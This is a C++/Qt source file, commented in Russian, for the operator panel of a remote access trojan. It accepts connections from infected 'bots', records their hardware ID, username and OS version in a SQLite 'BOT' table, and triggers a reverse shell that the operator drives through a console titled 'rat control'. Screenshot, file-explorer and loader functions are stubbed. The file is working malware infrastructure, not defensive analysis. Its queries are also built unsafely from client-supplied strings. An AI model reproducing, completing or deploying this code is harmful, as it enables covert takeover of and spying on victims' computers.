#include "mwindow.h"
#include "ui_mwindow.h"
#include "sqlite3.h"
#include "ui_screenshot.h"
#include "ui_explorer.h"

SOCKET MSOCKETS[10000];
sqlite3* db;

ScreenShot::ScreenShot(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::ScreenShot)
{
    ui->setupUi(this);
}

ScreenShot::~ScreenShot()
{
    delete ui;
}

Explorer::Explorer(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Explorer)
{
    ui->setupUi(this);
}

Explorer::~Explorer()
{
    delete ui;
}

WSocket::WSocket(int Port)
{
    InitArchiveFunc();
    this->LisPort = Port;
}

void WSocket::WaitClient()
{
    ListenSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (INVALID_SOCKET == ListenSocket)
    {
        printf("WSAGetLastError %d\n", WSAGetLastError());
    }
    sockaddr_in serverAddr;
    serverAddr.sin_addr.S_un.S_addr = INADDR_ANY;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(this->LisPort);

    int nRet = bind(ListenSocket, (sockaddr*)&serverAddr, sizeof(sockaddr_in));
    if (SOCKET_ERROR == nRet)
    {
        printf("WSAGetLastError %d\n", WSAGetLastError());
    }
    if (SOCKET_ERROR == listen(ListenSocket, SOMAXCONN))
    {
        printf("WSAGetLastError %d\n", WSAGetLastError());
    }

    while (TRUE)
    {
        SOCKET clientSocket;
        sockaddr_in clientAddr;
        int addLen = sizeof(sockaddr_in);
        clientSocket = accept(ListenSocket, (sockaddr*)&clientAddr, &addLen);
        if (INVALID_SOCKET != clientSocket)
        {
            CMDiDATA indata; //создаем структуру отвечающую за протокол
            CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
            memset(&indata, 0, sizeof(CMDiDATA)); //почистим
            memset(&client, 0, sizeof(CLIENTS)); //почистим

            if (sizeof(CMDiDATA) != recv(clientSocket, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от клиента
            {
                closesocket(clientSocket);
                continue;
            }

            if (indata.CMD == CMD_HADSHAKE) //если CMD = CMD_HADSHAKE, то это хендшейк
            {
                memcpy(&client, indata.DATA, sizeof(CLIENTS)); //копируем DATA в структуру client

                char* zapros_1 = new char[1000];
                //тут было бы возможно провести sql инъекцию, если бы не SELECT *'; DROP TABLE BOT;--
                wsprintfA(zapros_1, "SELECT NOMER FROM BOT WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", \
                          client.HWID, client.USERNAME, client.OSVER);

                sqlite3_stmt* stmt_1;
                // тут мы ищем по хвиду, имени юзера, и версии ос запись в базе данных
                if (sqlite3_prepare_v2(db, zapros_1, -1, &stmt_1, 0) == SQLITE_OK)
                {
                    if (sqlite3_step(stmt_1) == SQLITE_ROW)
                    {
                        int NOMER = 0;
                        //если запись есть - то выполняется следующий код:
                        NOMER = sqlite3_column_int(stmt_1, 0);
                        char* zapros_2 = new char[1000];
                        wsprintfA(zapros_2, "UPDATE BOT SET OTVET='1' WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", \
                                  client.HWID, client.USERNAME, client.OSVER);
                        char* ErrMsg = NULL;
                        //тут мы обновляем запись в базе данных делая поле ответ = 1, показывая что клиент теперь онлайн
                        if (SQLITE_OK == sqlite3_exec(db, zapros_2, nullptr, nullptr, &ErrMsg))
                        {
                            MSOCKETS[NOMER] = clientSocket;
                            char* IP = inet_ntoa(clientAddr.sin_addr);
                            AddNewClient(NOMER, IP, client.HWID, client.USERNAME, client.OSVER);
                        }
                        else
                        {
                            printf("ZAPROS: %s;\nError: %s\n", zapros_2, ErrMsg);
                        }
                        //чистим строку
                        delete[] zapros_2;
                    }
                    else //если клиент не найден то берем самое максимальное число записи из бд
                    {
                        sqlite3_stmt* stmt_3;
                        if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT ORDER BY NOMER DESC LIMIT 1", -1, &stmt_3, 0)\
                                == SQLITE_OK && sqlite3_step(stmt_3) == SQLITE_ROW)
                        {
                            int NEWNOMER = sqlite3_column_int(stmt_3, 0) + 1; // и плюсуем единичку
                            char* zapros_3 = new char[1000];
                            wsprintfA(zapros_3, \
                                "INSERT INTO BOT (NOMER, HWID, USERNAME, OSVER, OTVET) VALUES ('%d', '%s', '%s', '%s', 1)", \
                                NEWNOMER, client.HWID, client.USERNAME, client.OSVER);
                            char* ErrMsg = NULL;
                            if (SQLITE_OK == sqlite3_exec(db, zapros_3, nullptr, nullptr, &ErrMsg))
                            {
                                MSOCKETS[NEWNOMER] = clientSocket;
                                char* IP = inet_ntoa(clientAddr.sin_addr);
                                AddNewClient(NEWNOMER, IP, client.HWID, client.USERNAME, client.OSVER);
                                //сигнал тут может быть о том что новый клиент онлайн
                                printf("\n\nclient.HWID: %s\n\tlen: %d\n\nclient.USERNAME: %s\n\tlen: %d\n\n\
                                client.OSVER: %s\n\tlen: %d\n\n", client.HWID, lstrlenA(client.HWID), client.USERNAME, \
                                lstrlenA(client.USERNAME), client.OSVER, lstrlenA(client.OSVER));
                            }
                            else
                            {
                                printf("ZAPROS: %s;\nError: %s\n", zapros_3, ErrMsg);
                            }
                            sqlite3_finalize(stmt_3);
                            //чистим строку
                            delete[] zapros_3;
                        }
                    }
                }
                else
                {
                    printf("ZAPROS: %s;\nERR: %s\n", zapros_1, sqlite3_errmsg(db));
                }
                sqlite3_finalize(stmt_1);
                //чистим строку
                delete[] zapros_1;
            }
        }
    }
}

BOOL WSocket::sendInt(SOCKET con, int i)
{
    if (sizeof(int) == send(con, (char*)&i, sizeof(int), NULL))
    {
        return TRUE;
    }
    return FALSE;
}

BOOL WSocket::recvStat(SOCKET Con)
{
    return sendInt(Con, 0);
}

void WSocket::ReversCmd(int NOMER)
{
    CMDiDATA indata;
    memset(&indata, 0, sizeof(CMDiDATA));
    indata.CMD = CMD_SHELL;
    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
}

void WSocket::WaitShell(int NOMER)
{
    char szBuffer[4096];
    int i, count = 0;
    HANDLE  hIn, hOut;
    DWORD lpNumberOfBytesRead;

    SOCKET sListen;
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(8080);
    int sizeofaddr = sizeof(addr);
    sListen = socket(AF_INET, SOCK_STREAM, NULL);
    bind(sListen, (SOCKADDR*)&addr, sizeofaddr);
    listen(sListen, SOMAXCONN);

    AllocConsole();
    SetConsoleTitleA(" :: rat control :: ");
    hIn = GetStdHandle(STD_INPUT_HANDLE);
    hOut = GetStdHandle(STD_OUTPUT_HANDLE);

    SOCKET newConn = accept(sListen, (sockaddr*)&addr, &sizeofaddr);

    while (TRUE)
    {
        memset(szBuffer, 0, sizeof(szBuffer));
        Sleep(100);
        i = recv(newConn, szBuffer, sizeof(szBuffer), 0);
        WriteFile(hOut, szBuffer, i, &lpNumberOfBytesRead, 0);
        memset(szBuffer, 0, sizeof(szBuffer));
        Sleep(100);
        if (ReadFile(hIn, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL))
        {
            if ((!strstr(szBuffer, "exit")) == 0)
            {
                send(newConn, szBuffer, lpNumberOfBytesRead, 0);
                goto exit;
            }
            send(newConn, szBuffer, lpNumberOfBytesRead, 0);
        }
    }

exit:
    closesocket(sListen);
    closesocket(newConn);
    FreeConsole();
    emit CloseShell();
}


void WSocket::CheckOnline()
{
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT WHERE OTVET='1'", -1, &stmt, 0) == SQLITE_OK)
    {
        while (sqlite3_step(stmt) == SQLITE_ROW)
        {
            DWORD NOMER = sqlite3_column_int(stmt, 0);
            if (recvStat(MSOCKETS[NOMER]) == FALSE)
            {
                char* ErrMsg = NULL;
                char* zapros = new char[1000];
                wsprintfA(zapros, "UPDATE BOT SET OTVET='0' WHERE NOMER='%d'", NOMER);
                if (SQLITE_OK == sqlite3_exec(db, zapros, nullptr, nullptr, &ErrMsg))
                {
                    closesocket(MSOCKETS[NOMER]);
                    emit DelClient(NOMER);
                }
                delete[] zapros;
            }
        }
        sqlite3_finalize(stmt);
    }
}

void WSocket::InitArchiveFunc()
{
    ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll)
    {
        pRtlDecompressBuffer = (fRtlDecompressBuffer)\
            GetProcAddress(ntdll, "RtlDecompressBuffer");

        pRtlGetCompressionWorkSpaceSize = (fRtlGetCompressionWorkSpaceSize)\
            GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");

        pRtlCompressBuffer = (fRtlCompressBuffer)\
            GetProcAddress(ntdll, "RtlCompressBuffer");
    }
}

BYTE *WSocket::Decompress(BYTE *compBuffer, \
                          const int compBufferLen, \
                          const int uncompBufferLen, \
                          DWORD *uncompBufferSize)
{
    BYTE *uncompBuffer = (BYTE*)malloc(uncompBufferLen);
    NTSTATUS result = pRtlDecompressBuffer(
        COMPRESSION_FORMAT_LZNT1,
        uncompBuffer,
        uncompBufferLen,
        compBuffer,
        compBufferLen,
        uncompBufferSize
    );
    if (result != STATUS_SUCCESS)
    {
        return 0;
    }
    return uncompBuffer;
}

BYTE *WSocket::Compress(BYTE *uncompBuffer, \
                        const DWORD uncompBufferLen, \
                        DWORD compBufferLen, \
                        DWORD *compBufferSize)
{
    DWORD bufWorkspaceSize;
    DWORD fragWorkspaceSize;
    NTSTATUS ret = pRtlGetCompressionWorkSpaceSize(
        COMPRESSION_FORMAT_LZNT1,
        &bufWorkspaceSize,
        &fragWorkspaceSize
    );

    if (ret != STATUS_SUCCESS) {
        return 0;
    }
    VOID *workspace = (VOID *)LocalAlloc(LMEM_FIXED, bufWorkspaceSize);
    if (workspace == NULL) {
        return 0;
    }
    BYTE *compBuffer = (BYTE*)malloc(compBufferLen);
    NTSTATUS result = pRtlCompressBuffer(
        COMPRESSION_FORMAT_LZNT1,
        uncompBuffer,
        uncompBufferLen,
        compBuffer,
        compBufferLen,
        2048,
        compBufferSize,
        workspace
    );
    LocalFree(workspace);
    if (result != STATUS_SUCCESS) {
        return 0;
    }
    return compBuffer;
}

MWindow::MWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MWindow)
{
    ui->setupUi(this);

    WSADATA wsadata;
    int err = WSAStartup(MAKEWORD(2, 2), &wsadata);
    if (err)
    {
        printf("WSAGetLastError %d\n", WSAGetLastError());
    }

    if (SQLITE_OK != sqlite3_open_v2("bots.db", &db, SQLITE_OPEN_READWRITE, NULL))
    {
        sqlite3_close(db);

        QMessageBox msgBox;
        msgBox.setText("Настройка!");
        msgBox.setIcon(QMessageBox::Question);
        msgBox.setInformativeText("Создать новую базу данных?");
        msgBox.setStandardButtons(QMessageBox::Ok | QMessageBox::Cancel);
        msgBox.setDefaultButton(QMessageBox::Ok);

        int ret = msgBox.exec();
        switch (ret)
        {
            case QMessageBox::Save:
            {
                 ExitProcess(0);
                 break;
            }

            case QMessageBox::Ok:
            {
                if (SQLITE_OK == sqlite3_open_v2("bots.db", &db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, NULL))
                {
                    char* ErrMsg = NULL;
                    if (SQLITE_OK == sqlite3_exec(db, "CREATE TABLE 'BOT' \
                    ('NOMER' INTEGER, 'USERNAME' TEXT, 'OSVER' TEXT, 'HWID' \
                    TEXT, 'OTVET' TEXT, PRIMARY KEY('NOMER'));", nullptr, \
                    nullptr, &ErrMsg))
                    {
                        if (SQLITE_OK == sqlite3_exec(db, \
                                                      "INSERT INTO BOT (NOMER, HWID, USERNAME, OSVER, OTVET) VALUES (0, 'test', 'test', 'test', 0)", \
                                                      nullptr, nullptr, &ErrMsg))
                        {
                            msgBox.setInformativeText("Новая база данных создана!");
                            msgBox.setIcon(QMessageBox::Information);
                            msgBox.setText("Успешно!");
                            msgBox.setStandardButtons(QMessageBox::Ok);
                            msgBox.exec();
                        }
                        else
                        {
                            msgBox.setInformativeText(ErrMsg);
                            msgBox.setIcon(QMessageBox::Warning);
                            msgBox.setText("ОШИБКА!");
                            msgBox.setStandardButtons(QMessageBox::Ok);
                            msgBox.exec();
                            QApplication::exit();
                        }
                    }
                    else
                    {
                        msgBox.setInformativeText(ErrMsg);
                        msgBox.setIcon(QMessageBox::Warning);
                        msgBox.setText("ОШИБКА!");
                        msgBox.setStandardButtons(QMessageBox::Ok);
                        msgBox.exec();
                        QApplication::exit();
                    }
                }
                break;
            }

            default:
            {
                ExitProcess(0);
                break;
            }
        }
    }

    menu = new QMenu(this);

    Revershell = new QAction("Revershell", this);
    connect(Revershell, SIGNAL(triggered()), this, SLOT(sRunShell()));
    menu->addAction(Revershell);

    Explorer = new QAction("Explorer", this);
    connect(Explorer, SIGNAL(triggered()), this, SLOT(sExplorer()));
    menu->addAction(Explorer);

    ScreenShot = new QAction("ScreenShot", this);
    connect(ScreenShot, SIGNAL(triggered()), this, SLOT(sScreen()));
    menu->addAction(ScreenShot);

    Loader = new QAction("Loader", this);
    connect(Loader, SIGNAL(triggered()), this, SLOT(sLoader()));
    menu->addAction(Loader);

    ui->tableWidget->setContextMenuPolicy(Qt::CustomContextMenu);
    ui->tableWidget->setSelectionMode(QAbstractItemView::SingleSelection);
    ui->tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
    ui->tableWidget->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
    ui->tableWidget->verticalHeader()->hide();
    ui->tableWidget->hideColumn(0);

    connect(ui->tableWidget, SIGNAL(customContextMenuRequested(QPoint)), \
            this, SLOT(sOpenMenu(QPoint)));

    wsocket80 = new WSocket(80);
    servHandl = new WSocket(80);

    mainSocketThread = new QThread(this);
    connect(wsocket80, &WSocket::AddNewClient, this, &MWindow::AddNewClient);
    connect(servHandl, &WSocket::DelClient, this, &MWindow::DelClient);
    connect(this, &MWindow::WaitClient, wsocket80, &WSocket::WaitClient);

    connect(this, &MWindow::CheckOnline, servHandl, &WSocket::CheckOnline);
    connect(this, &MWindow::ReversCmd, servHandl, &WSocket::ReversCmd);
    connect(this, SIGNAL(destroyed()), mainSocketThread, SLOT(quit()));

    wsocket80->moveToThread(mainSocketThread);
    mainSocketThread->start();
    emit WaitClient();
}

void MWindow::sOpenMenu(QPoint pos)
{
    menu->popup(ui->tableWidget->viewport()->mapToGlobal(pos));
}

void MWindow::sRunShell()
{
    int intROW = -1;
    foreach (QModelIndex index, \
             ui->tableWidget->selectionModel()->selectedIndexes())
    {
        intROW = index.row();
    }
    if (intROW != -1)
    {
        if(QTableWidgetItem *item = ui->tableWidget->item(intROW, 0))
        {
            int NOMER = item->text().toInt();
            shellSocket = new WSocket(8080);
            shellSocketThread = new QThread(this);
            connect(this, &MWindow::WaitShell, shellSocket, &WSocket::WaitShell);
            connect(shellSocket, &WSocket::CloseShell, this, &MWindow::CloseShell);
            shellSocket->moveToThread(shellSocketThread);
            shellSocketThread->start();
            servHandl->ReversCmd(NOMER);
            emit WaitShell(intROW);
        }
    }
}

void MWindow::sExplorer()
{
    int intROW = -1;
    foreach (QModelIndex index, \
             ui->tableWidget->selectionModel()->selectedIndexes())
    {
        intROW = index.row();
    }
    if (intROW != -1)
    {
        if(QTableWidgetItem *item = ui->tableWidget->item(intROW, 0))
        {
            int NOMER = item->text().toInt();
        }
    }
}

void MWindow::sScreen()
{
    int intROW = -1;
    foreach (QModelIndex index, \
             ui->tableWidget->selectionModel()->selectedIndexes())
    {
        intROW = index.row();
    }
    if (intROW != -1)
    {
        if(QTableWidgetItem *item = ui->tableWidget->item(intROW, 0))
        {
            int NOMER = item->text().toInt();
        }
    }
}

void MWindow::sLoader()
{
    int intROW = -1;
    foreach (QModelIndex index, \
             ui->tableWidget->selectionModel()->selectedIndexes())
    {
        intROW = index.row();
    }
    if (intROW != -1)
    {
        if(QTableWidgetItem *item = ui->tableWidget->item(intROW, 0))
        {
            int NOMER = item->text().toInt();
        }
    }
}

void MWindow::AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char *OSVER)
{
    ui->tableWidget->insertRow(ui->tableWidget->rowCount());
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, \
                             0, new QTableWidgetItem(QString::number(NOMER)));
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, \
                             1, new QTableWidgetItem(QString::fromUtf8(IP)));
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, \
                             2, new QTableWidgetItem(QString::fromUtf8(HWID)));
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, \
                             3, new QTableWidgetItem(QString::fromUtf8(USERNAME)));
    ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, \
                             4, new QTableWidgetItem(QString::fromUtf8(OSVER)));
}

void MWindow::DelClient(int NOMER)
{
    int intROW = ui->tableWidget->rowCount();
    for(int i = 0; i <= intROW; ++i)
    {
        if(QTableWidgetItem *item = ui->tableWidget->item(i, 0))
        {
            if(item->text() == QString::number(NOMER))
            {
                ui->tableWidget->removeRow(i);
            }
        }
    }
}

void MWindow::CloseShell()
{
    shellSocketThread->quit();
}

void MWindow::on_CreateBuild_triggered()
{

}

void MWindow::on_AddPorts_triggered()
{

}

void MWindow::on_OpenBD_triggered()
{

}

MWindow::~MWindow()
{
    delete ui;
}

void MWindow::on_OnlineRecv_triggered()
{
    emit CheckOnline();
}
